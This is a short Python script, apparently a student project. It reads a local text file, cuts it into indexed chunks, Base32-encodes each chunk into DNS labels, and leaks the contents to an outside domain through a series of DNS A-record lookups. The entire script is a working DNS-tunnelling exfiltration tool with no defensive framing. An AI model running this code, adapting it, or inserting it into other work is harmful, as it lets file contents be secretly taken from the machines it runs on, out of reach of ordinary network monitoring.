import base64

import dns.resolver


class Tool:
    def __init__(self, path, label_len, record_len):
        self.path = path
        self.message = self.get_message()
        self.label_len = label_len
        self.record_len = record_len
        self.file_name=self.get_file_name()
        self.pkts = self.split_message()

    def encode_to_Base32(self, str_):
        b = bytes(str_, 'utf-8')
        mes = base64.b32encode(b)

        b = str(mes, 'utf-8')
        b = '.'.join([b[i:i + self.label_len] for i in range(0, len(b), self.label_len)])
        b = b + '.'

        # enc_mes='.'.join([mes[i:i + 2] for i in range(0, len(mes), 2)])
        return b

    def get_message(self):
        with open(self.path, mode="r", encoding="utf-8") as file:
            lines = file.readlines()
            message = "".join(lines)
            return message

    def get_file_name(self):
        file_name = self.path.split('\\')[-1]
        return file_name
    def split_message(self):
        pkts = list()
        pkts.append(self.file_name + f" #FILENAME#")
        for i in range(0, self.message.__len__(), self.record_len):
            pkts.append(self.message[i:min(i + self.record_len, self.message.__len__())] + f" #index {i}#")
        return pkts

    def send_messages(self):
        for i, pkt in enumerate(self.pkts):
            msg = self.encode_to_Base32(pkt)
            answers = dns.resolver.query(f'www.{msg}jct.ac.il', 'A')


if __name__ == '__main__':
    tool = Tool(r"C:\Users\מתניה\Functions_For_Project\Text.txt", 5, 15)

    tool.send_messages()
